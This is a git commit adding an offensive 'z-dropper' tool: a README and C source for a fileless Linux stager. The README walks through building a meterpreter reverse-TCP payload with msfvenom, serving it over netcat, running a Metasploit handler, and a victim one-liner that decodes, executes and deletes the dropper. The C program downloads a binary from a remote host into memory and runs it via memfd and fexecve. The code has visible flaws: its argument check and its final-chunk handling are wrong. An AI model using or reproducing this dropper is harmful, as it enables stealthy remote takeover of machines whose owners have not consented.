c934b6c599490bbcc6d7685987cbca06a6cfb4c4
mzet <mzet@owasp.org>
2022-03-17 17:54:13 +0100

    GEN1 version

--- README.md
+++ README.md
@@ -1,1 +1,38 @@
 # z-dropper
+
+## GEN1
+
+Staging machine (ephemeral):
+
+```
+staging$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<C2_IP> LPORT=443 --platform linux -f elf -a x64 -o beacon-mettle
+staging$ nc -nlvp 443 < beacon-mettle
+```
+
+Command and control machine:
+
+```
+c2$ cat > mettle-handler.rc <<'EOF'
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter_reverse_tcp
+set LHOST <C2_IP>  
+set LPORT 443 
+set ExitOnSession false
+exploit -j -z
+EOF
+
+c2$ msfconsole -r mettle-handler.rc
+```
+
+Attacker machine:
+
+```
+redteam$ git clone https://github.com/mzet-/z-dropper; cd z-dropper
+redteam$ EXE=z-dropper-gen1; zig cc -static -Os -target x86_64-linux-musl ${EXE}.c -o $EXE; strip -x -R -s -g $EXE; echo; cat "$EXE" | base64 -w 0; echo; echo
+```
+
+Victim machine:
+
+```
+victim$ echo -n "$BASE64_ENCODED_BIN" | base64 -d >/tmp/s; chmod +x /tmp/s; /tmp/s <STAGING_IP> 443; rm /tmp/s
+```
---
+++ z-dropper-gen1.c
@@ -0,0 +1,50 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+
+#define __NR_memfd_create 319
+#define MFD_CLOEXEC 1
+
+static inline int memfd_create(const char *name, unsigned int flags) {
+    return syscall(__NR_memfd_create, name, flags);
+}
+
+extern char **environ;
+
+int main(int argc, char* argv[]) {
+    int s, fd;
+    struct sockaddr_in addr;
+    char buf[1024] = {0};
+    char *args[2]= {getenv("Z_PROC_NAME"), NULL};
+    int count;
+
+    if(argc < 2) exit(1);
+
+    memset(&addr, 0, sizeof(struct sockaddr_in));
+    addr.sin_family = AF_INET;
+    if (inet_pton(AF_INET, argv[1], &addr.sin_addr) <= 0) exit(1);
+    addr.sin_port = htons(atoi(argv[2]));
+
+    if ((s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit(1);
+    if (connect(s, (struct sockaddr*)&addr, sizeof(struct sockaddr_in)) < 0) exit(1);
+
+    if ((fd = memfd_create(getenv("Z_PROC_NAME"), MFD_CLOEXEC)) < 0) exit(1);
+
+    while (1) {
+      count = read(s, buf, sizeof(buf));
+      if (count <= 0 || count < sizeof(buf))
+          break;
+      write(fd, buf, count);
+    }
+    close(s);
+
+    if (fexecve(fd, args, environ) < 0) exit(1);
+
+    return 0;
+}
